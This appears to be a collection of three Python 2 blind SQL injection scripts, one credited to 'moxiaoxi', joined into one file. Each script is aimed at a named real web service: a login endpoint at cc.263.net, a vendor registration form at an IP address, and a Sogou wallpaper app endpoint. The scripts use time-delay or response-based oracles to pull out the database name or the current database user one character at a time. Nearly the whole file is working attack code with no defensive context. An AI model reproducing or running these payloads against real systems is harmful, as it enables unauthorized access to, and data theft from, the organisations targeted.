#!usr/bin/python
# -*- coding:utf-8 -*-

__Author__='moxiaoxi'
__Filename__='blindsqlinjextion.py'


import httplib 
import time 
import string 
import sys 
import random 
import urllib 

headers = {'Content-Type': 'application/x-www-form-urlencoded'} 

payloads = 'ABCDEFGHIJKLMNOPQRSTYVWXYZ0123456789@_.' 

print '[%s] Start to retrive dbname:' % time.strftime('%H:%M:%S', time.localtime()) 
user = '' 
isEnd=False
for i in range(1, 36): 
    if isEnd:
        break
    isEnd=True
    for payload in payloads: 
        url='/quickLogin'
        start_time=time.time()
        data='quickLoginName=lis&quickLoginPasscode=123456\' or MID(database(),'+str(i)+',1)=\''+payload+'&clientloginType=11'
        conn = httplib.HTTPConnection('cc.263.net', timeout=60) 
        conn.request(method='POST',url=url,body=data, headers=headers) 
        html_doc = conn.getresponse().read() 
        conn.close() 
        print '.', 
        if(time.time()-start_time>20):
            isEnd=False
            user += payload 
            print '\n[in progress]', user, 
            break 
        time.sleep(0.01)
print '\n[Done] db dbname is %s' % user 
time.sleep(20)

#encoding=utf-8

import httplib

import time

import string

import sys
import re

import random

import urllib



headers = {

    'Content-Type': 'application/x-www-form-urlencoded',
}



payloads = list(string.ascii_lowercase)

payloads += list(string.ascii_uppercase)

for i in range(0,10):

    payloads.append(str(i))




print 'start to retrive Oracle user:'

user = ''

for i in range(1,5,1):

    for payload in payloads:

        conn = httplib.HTTPConnection('222.190.108.19', timeout=60)

        params = {
            
            'address': "e",
            'business_license': "e",
            'company': "e",
            'country': "1",
            'email': "s",
            'fullname': "e",
            'password': "",
            'phone': "e",
            'tags': "1",
            'tax_number': "e",
            'username': "e' and ascii(substr(SYS_CONTEXT('USERENV','CURRENT_USER'),%s,1))=%s and 'a'='a" % (i, ord(payload)),

            }

        conn.request(method='POST',

                     url='/addVendorsAction',

                     body = urllib.urlencode(params),

                     headers = headers)

        start_time = time.time()

        html_doc = conn.getresponse().read()

        #print html_doc

        conn.close()

        print '.',

        if re.search('用户名已存在',html_doc) > 0:  # true

            user += payload

            print '\n[in progress]', user

            break



print '\nOracle user is', user


#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
import time
payloads='abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'
#payloads='abcdefqrstuvwxyj'
user=''
print 'Start to retrive current user:'
for i in range(1,23):
    for payload in payloads:
        starttime=time.time()
        url = "http://download.android.bizhi.sogou.com/client.php?clientid=69ce12b3194bd597e9ecff768e05c172&w=720' AND (SELECT * FROM (SELECT(case when (user() like '"+user+payload+"%') then sleep(2) else sleep(0) end))lzRG) AND 'IgTp'='IgTp&h=1184&v=2.5.5.71399&dv=6.0.1&dn=Moto G 2014 LTE&dr=720x1184&r=0032-0032&j=56eae447a9e7d3b52edcc26946ba5198&i=d41d8cd98f00b204e9800998ecf8427e&n=WIFI"
        response=requests.get(url)
        if time.time() - starttime > 2:
            user+=payload
            print '\n user is:',user,
            break
        else:
            print '.',
print '\n[Done] current user is %s' %user